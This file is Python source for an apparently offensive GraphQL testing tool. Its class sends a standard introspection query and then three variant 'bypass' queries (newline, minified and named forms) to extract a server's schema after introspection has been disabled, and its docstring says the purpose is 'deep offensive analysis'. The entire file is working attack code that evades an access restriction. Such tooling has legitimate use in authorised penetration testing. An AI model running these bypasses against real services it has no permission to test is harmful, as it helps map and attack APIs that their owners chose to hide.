import requests
import json
from typing import Dict, Any

class IntrospectionEngine:
    """
    Detects and bypasses introspection restrictions.
    Extracts the schema for deep offensive analysis.
    """
    def __init__(self):
        self.standard_query = '{"query":"query{\\n  __schema {\\n    queryType {\\n      name\\n    }\\n  }\\n}"}'
        self.bypass_queries = [
            '{"query":"query{\\n  __schema\\n  {\\n    queryType {\\n      name\\n    }\\n  }\\n}"}', # newline bypass
            '{"query":"query{__schema{queryType{name}}}"}', # minified
            '{"query":"\\n    query IntrospectionQuery {\\n      __schema {\\n        queryType { name }\\n      }\\n    }\\n  "}'
        ]

    def extract_schema(self, endpoint: str) -> Dict[str, Any]:
        """
        Attempts to extract the schema using standard and bypass methods.
        """
        print(f"Testing introspection on {endpoint}")
        
        headers = {"Content-Type": "application/json"}
        
        # Test standard
        try:
            resp = requests.post(endpoint, data=self.standard_query, headers=headers, timeout=10)
            if self._is_valid_schema(resp.text):
                return {"introspection_enabled": True, "method": "standard", "schema": resp.json()}
        except Exception:
            pass
            
        # Test bypasses
        for idx, query in enumerate(self.bypass_queries):
            try:
                resp = requests.post(endpoint, data=query, headers=headers, timeout=10)
                if self._is_valid_schema(resp.text):
                    return {"introspection_enabled": True, "method": f"bypass_{idx}", "schema": resp.json()}
            except Exception:
                continue

        return {"introspection_enabled": False, "method": None, "schema": None}

    def _is_valid_schema(self, response_text: str) -> bool:
        if not response_text: return False
        try:
            data = json.loads(response_text)
            if "data" in data and "__schema" in data["data"]:
                return True
        except json.JSONDecodeError:
            pass
        return False

introspection_engine = IntrospectionEngine()
